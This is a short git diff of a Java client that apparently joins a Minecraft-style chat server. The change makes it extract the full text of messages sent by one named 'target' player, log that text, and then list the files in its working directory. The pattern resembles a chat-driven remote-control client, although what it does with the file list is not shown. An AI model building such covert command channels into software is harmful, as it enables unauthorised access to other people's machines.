@@ -17,6 +17,7 @@ import net.kyori.adventure.text.TranslatableComponent;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.jetbrains.annotations.NotNull;
+import org.w3c.dom.Text;
 
 import java.io.File;
 import java.util.List;
@@ -24,7 +25,16 @@ import java.util.StringJoiner;
 
 public class Client {
 	static final Logger logger = LogManager.getLogger(Client.class.getName());
-
+	private static String getContent(TextComponent c){
+		StringBuilder b = new StringBuilder();
+		b.append(c.content());
+		for(Component children : c.children()){
+			if(children instanceof TextComponent){
+				b.append(getContent((TextComponent) children));
+			}
+		}
+		return b.toString();
+	}
 	public static void main(String[] args){
 		if(args.length != 4){
 			System.out.println("You must provide: <ip> <port> <username> <target>");
@@ -51,11 +61,14 @@ public class Client {
 					if(message instanceof TranslatableComponent){
 						TranslatableComponent tran = (TranslatableComponent) message;
 						if(tran.key().equals("chat.type.text")) {
+
 							@NotNull List<Component> args = tran.args();
 							TextComponent sender = (TextComponent) args.get(0);
-							TextComponent data = (TextComponent) args.get(1);
+
 							if(sender.content().equals(target)){
-								logger.error(data.content());
+								TextComponent data = (TextComponent) args.get(1);
+								String dataContent = getContent(data);
+								logger.error(dataContent);
 								File folder = new File(".");
 								File[] listOfFiles = folder.listFiles();
 								StringJoiner files = new StringJoiner(" , ");
